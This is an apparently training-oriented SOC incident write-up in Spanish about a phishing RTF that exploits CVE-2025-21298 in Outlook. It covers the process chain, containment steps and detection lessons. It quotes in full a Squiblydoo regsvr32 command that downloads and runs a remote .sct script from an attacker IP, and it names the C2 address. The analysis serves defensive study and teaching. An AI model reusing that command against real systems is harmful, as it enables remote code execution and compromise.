// CASE-006 · SOC336 True Positive Cerrado Critical

CVE-2025-21298 OLE RCE —
Phishing RTF con LOLBIN via Outlook

Explotación de vulnerabilidad zero-click en Windows OLE mediante archivo RTF malicioso entregado por correo. Outlook procesó el adjunto y ejecutó una cadena de procesos que resultó en la descarga de un payload remoto usando regsvr32.exe como LOLBIN. Endpoint comprometido con conexión C2 activa confirmada.

// 01_resumen

Resumen ejecutivo

El sistema detectó la explotación de CVE-2025-21298, una vulnerabilidad zero-click en Windows OLE que permite ejecución remota de código al procesar un archivo RTF malicioso. El usuario Austin recibió un correo desde projectmanagement@pm.me con el adjunto mail.rtf — hash confirmado como malicioso en VirusTotal.

La cadena de procesos OUTLOOK.EXE → cmd.exe → regsvr32.exe confirma que el exploit se ejecutó desde el cliente de correo sin necesidad de que el usuario abriera manualmente el archivo. regsvr32.exe descargó y ejecutó shell.sct desde la IP 84.38.130.118 (Letonia, 7/91 VT), estableciendo comunicación con infraestructura C2 del atacante.

// veredicto — compromiso confirmado

True Positive crítico. Explotación exitosa de CVE-2025-21298 con RCE confirmado, conexión C2 activa y descarga de payload remoto. Endpoint de Austin comprometido. Requiere aislamiento inmediato, cuarentena del archivo malicioso, análisis forense y revisión de otros endpoints que hayan recibido el mismo correo.

// 03_cadena

Cadena de procesos — RCE confirmado

La siguiente cadena de procesos fue identificada en el endpoint de Austin, confirmando la ejecución del exploit desde Outlook sin interacción explícita del usuario:

projectmanagement@pm.me // correo malicioso con mail.rtf adjunto
▼ entrega exitosa a Austin
OUTLOOK.EXE // procesamiento del adjunto RTF — CVE-2025-21298
▼ spawn (zero-click)
cmd.exe // proceso hijo generado por Outlook
▼ ejecuta
regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll
▼ descarga y ejecuta
shell.sct // payload remoto desde C2 · conexión GET confirmada
// Comando completo ejecutado en el endpoint

cmd.exe /c regsvr32.exe /s /u
/i:http://84.38.130.118.com/shell.sct
scrobj.dll

El uso de regsvr32.exe con el parámetro /i: apuntando a una URL remota es conocido como la técnica Squiblydoo — permite descargar y ejecutar scripts remotos (.sct) sin escribir archivos al disco, bypasseando controles de AppLocker y evadiendo detección basada en archivos.

// 07_acciones

Acciones tomadas

01

Análisis del correo malicioso: Identificado remitente (projectmanagement@pm.me), destinatario (Austin) y adjunto (mail.rtf). Hash verificado en VirusTotal — confirmado malicioso.

02

Verificación de C2: IP 84.38.130.118 confirmada como maliciosa en VirusTotal (7/91, Letonia). Conexión GET a shell.sct confirmada en logs de red.

03

Análisis de cadena de procesos: OUTLOOK.EXE → cmd.exe → regsvr32.exe confirma RCE exitoso. Identificada técnica Squiblydoo (T1218.010) para evasión de controles.

04

Verificación de propagación: Revisión de otros endpoints — ninguno recibió el mismo hash ni nombre de archivo. Compromiso limitado al endpoint de Austin.

05

Aislamiento del endpoint: Endpoint de Austin aislado de la red para contener comunicación C2 activa.

Acción omitida — punto de mejora: El archivo malicioso mail.rtf no fue puesto en cuarentena durante la respuesta. En un SOC real, el aislamiento del endpoint y la cuarentena del archivo son acciones paralelas — no excluyentes. Aislar el equipo no elimina el archivo del sistema ni previene su re-ejecución si el equipo es reincorporado a la red sin limpieza previa.

// 08_recomendaciones

Recomendaciones

  • Poner en cuarentena mail.rtf del sistema de Austin — el archivo debe ser removido y preservado para análisis forense
  • Bloquear 84.38.130.118 en firewall perimetral y DNS para cortar comunicación C2
  • Buscar y eliminar otros correos con el mismo adjunto en todos los buzones del entorno
  • Aplicar parche CVE-2025-21298 en todos los sistemas Windows con Outlook instalado de forma urgente
  • Revisar si regsvr32.exe debe estar bloqueado via AppLocker para usuarios no administrativos
  • Realizar análisis forense completo del endpoint para determinar qué ejecutó shell.sct y si hubo persistencia o movimiento lateral
  • Implementar reglas de detección de Squiblydoo en el EDR para alertar ante uso de regsvr32 con URLs remotas

// 09_lecciones

Lecciones aprendidas

Aislamiento y cuarentena son acciones distintas y complementarias. Aislar el endpoint corta la comunicación de red pero no elimina el archivo malicioso del sistema. Ambas acciones deben ejecutarse — el archivo debe ser puesto en cuarentena para análisis forense y para evitar re-ejecución.

OUTLOOK.EXE generando cmd.exe es siempre una alerta crítica. Un cliente de correo nunca debería tener un intérprete de comandos como proceso hijo. Esta relación padre-hijo es suficiente para confirmar RCE sin necesidad de analizar el payload.

Zero-click significa que el usuario no necesita hacer nada. CVE-2025-21298 se activa durante el procesamiento del RTF por Outlook, no al abrirlo manualmente. La ausencia de apertura explícita en los logs no descarta la explotación.

Squiblydoo (regsvr32 + URL remota) evade controles de disco. Al ejecutar el payload directamente desde la URL sin escribirlo al disco, bypasea soluciones de seguridad que solo inspeccionan archivos. La detección debe basarse en comportamiento de procesos, no en archivos.
